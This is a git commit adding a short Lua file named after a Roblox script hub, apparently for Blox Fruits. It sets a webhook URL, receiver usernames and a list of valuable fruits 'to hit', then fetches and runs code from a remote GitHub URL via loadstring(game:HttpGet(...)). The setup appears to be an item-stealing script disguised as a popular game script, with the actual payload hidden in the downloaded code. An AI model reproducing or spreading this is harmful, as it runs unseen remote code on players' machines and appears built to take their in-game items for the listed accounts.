a3c2ba0d7b24204a1701968c9ae5ef7ef4147774
ogscriptHub <99rraull@gmail.com>
2025-03-22 11:57:44 +0100

    Create redZscript.lua

---
+++ redZscript.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=X3dOWlRUYi1JamVqUW55c2IyS1VpQTpZMjFJaWJWUVE3Skl6Y1VqNVRKMVQxY3pWRTF1Q29VSU9SOFUxNDBiN3U2c3EzTDAtZS0wU3FLd2tHUU00aXFZYmxLMHowQVdmSl9GdG82SWlFTFNvRUlxd3JsMkQ5eVFMaFpEUjRtY0lOejk1bDZnaGN4NmwxZ0V2N1B3bzVSeWJ3ZW4tcFZwX2xzX3kyMjhsSlRqUkE2cDUzUVFUSDFzT2dzNGRSRjdCdWM" -- << Your Webhook
+Usernames = {"LOV3_MIAMI", "c00b4"} -- << Your username(-s).
+FruitsToHit = {"Dragon-Dragon", "Control-Control", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
